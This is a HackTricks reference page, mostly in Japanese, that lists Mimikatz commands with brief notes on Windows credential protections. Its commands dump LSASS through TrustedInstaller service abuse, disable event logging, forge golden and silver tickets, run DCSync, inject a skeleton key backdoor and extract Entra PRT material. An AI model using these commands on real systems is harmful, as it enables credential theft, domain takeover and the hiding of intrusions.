# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のものを基にしています**。詳細は元ページを確認してください！

## LM and Clear-Text in memory

Windows 8.1 および Windows Server 2012 R2 以降、credential theft への対策として重要な保護策が実装されています:

- **LM hashes と plain-text passwords** は、セキュリティ強化のため memory に保存されなくなりました。特定の registry 設定である _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定して Digest Authentication を無効化することで、LSASS に "clear-text" passwords が cache されないようにします。

- **LSA Protection** は、Local Security Authority (LSA) process を不正な memory reading と code injection から保護するために導入されました。これは LSASS を protected process としてマークすることで実現されます。LSA Protection を有効化するには:
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ の registry を変更し、`RunAsPPL` を `dword:00000001` に設定します。
2. 管理対象デバイス全体にこの registry 変更を適用する Group Policy Object (GPO) を実装します。

これらの保護策があっても、Mimikatz のような tools は特定の drivers を使って LSA Protection を回避できますが、そのような actions は event logs に記録される可能性が高いです。

現代の workstations ではこの点がさらに重要です。なぜなら、**Credential Guard は多くの Windows 11 22H2+ および Windows Server 2025 の domain-joined, non-DC systems で default で有効**であり、さらに **LSASS-as-PPL は新規の Windows 11 22H2+ installs で default で有効**だからです。実際には、`sekurlsa::logonpasswords` で得られる情報は古い tradecraft が想定していたより少ないことが多く、operator はますます **offline minidumps**、**Kerberos key extraction (`sekurlsa::ekeys`)**、または **CloudAP/PRT-oriented modules** に pivot しています。保護側については [Windows credentials protections](credentials-protections.md) を確認してください。

### Counteracting SeDebugPrivilege Removal

Administrators は通常 SeDebugPrivilege を持っており、これによって programs を debug できます。この privilege は、攻撃者が memory から credentials を抽出するためによく使う unauthorized memory dumps を防ぐために制限できます。ただし、この privilege を削除しても、TrustedInstaller account は customized service configuration を使って memory dumps を実行できます:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
これにより、`lsass.exe` のメモリをファイルにダンプでき、後で別のシステムで分析して credentials を抽出できます:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz における Event log tampering は、主に2つの操作で行われます。イベントログを消去することと、Event service にパッチを当てて新しいイベントの記録を防ぐことです。以下は、これらの操作を行うコマンドです:

#### Clearing Event Logs

- **Command**: この操作は event logs を削除し、悪意のある活動を追跡しにくくすることを目的としています。
- Mimikatz には、標準ドキュメント上で command line から event logs を直接消去するための直接的なコマンドはありません。ただし、event log の操作は通常、Mimikatz の外部で system tools や scripts を使って、特定の logs を消去します（例: PowerShell や Windows Event Viewer を使用）。

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- この experimental command は Event Logging Service の動作を変更し、実質的に新しい events が記録されるのを防ぐように設計されています。
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command は、Mimikatz が system services を変更するために必要な privileges で動作することを保証します。
- その後、`event::drop` command が Event Logging service に patch を当てます。

### Kerberos Ticket Attacks

以下の commands は、すばやい syntax の確認用です。[golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), および [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) の専用ページには、最新の AES/PAC/opsec に関する詳細が含まれています。

### Golden Ticket Creation

Golden Ticket は、ドメイン全体への access impersonation を可能にします。主要な command と parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: ドメイン名。
- `/sid`: ドメインの Security Identifier (SID)。
- `/user`: impersonate する username。
- `/krbtgt`: ドメインの KDC service account の NTLM hash。
- `/ptt`: ticket を直接 memory に inject します。
- `/ticket`: ticket を later use のために保存します。

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticket は特定のサービスへのアクセスを許可します。主要なコマンドとパラメータ:

- Command: Golden Ticket と同様だが、特定のサービスを対象にする。
- Parameters:
- `/service`: 対象とするサービス（例: cifs, http）。
- 他のパラメータは Golden Ticket と同様。

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket の作成

Trust Ticket は、信頼関係を利用してドメインをまたいでリソースへアクセスするために使われます。主なコマンドとパラメータ:

- Command: Golden Ticket に似ていますが、trust relationships 用です。
- Parameters:
- `/target`: 対象ドメインの FQDN。
- `/rc4`: trust account の NTLM hash。

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- 現在のユーザーセッションのすべてのKerberosチケットを一覧表示します。

- **Pass the Cache**:

- Command: `kerberos::ptc`
- キャッシュファイルからKerberosチケットを注入します。
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- 別のセッションでKerberosチケットを使用できるようにします。
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- セッションからすべてのKerberosチケットを消去します。
- チケット操作コマンドを使う前に、競合を避けるために有用です。

### Over-Pass-the-Hash / Pass-the-Key

`RC4` が無効化されているか信頼性が低い場合、Mimikatz は NT hash だけを使うのではなく、現在のログオンセッションに **AES128/AES256 Kerberos keys** をパッチできます。これは通常、`sekurlsa::pth` を NTLM 専用として扱うよりも、現代的なドメインに適しています。
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` は新しいコンソールを起動せずに現在のプロセスを再利用するため、同じコンテキストで `lsadump::dcsync` のようなものをすぐ実行したいときに便利です。

### Active Directory Tampering

- **DCShadow**: 一時的にマシンを DC として動作させ、AD オブジェクトを操作する。See [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC を模倣して password data を要求する。See [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA から credentials を抽出する。

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: computer account の password data を使って DC を impersonate する。

- _No specific command provided for NetSync in original context._

- **LSADUMP::SAM**: ローカル SAM database にアクセスする。

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: registry に保存された secrets を復号する。

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーに新しい NTLM hash を設定する。

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust authentication information を取得する。
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** または **hybrid-joined** のホストでは、`sekurlsa::cloudap` により LSASS からキャッシュされた **Primary Refresh Token (PRT)** の material を公開できる。関連する Proof-of-Possession key が software-protected の場合、`dpapi::cloudapkd` により、後続の **Pass-the-PRT** ワークフローに必要な clear/derived key material を導出できる。
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
これは、key が TPM-backed の場合にはかなり難しくなりますが、hybrid endpoints では確認する価値があります。なぜなら、cached CloudAP data のほうが classic `wdigest` output より興味深い可能性があるからです。cloud-side abuse chain については、[Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) を参照してください。

### Miscellaneous

- **MISC::Skeleton**: DC の LSASS に backdoor を inject します。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights を取得します。

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges を取得します。
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: ログオン中ユーザーの credentials を表示します。

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: メモリから Kerberos tickets を抽出します。
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: SID と SIDHistory を変更します。

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _オリジナルの文脈では modify 用の具体的な command はありません。_

- **TOKEN::Elevate**: tokens を impersonate します。
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 複数の RDP sessions を許可します。

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions を一覧表示します。
- _オリジナルの文脈では TS::Sessions 用の具体的な command はありません。_

### Vault

- Windows Vault から passwords を抽出します。
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
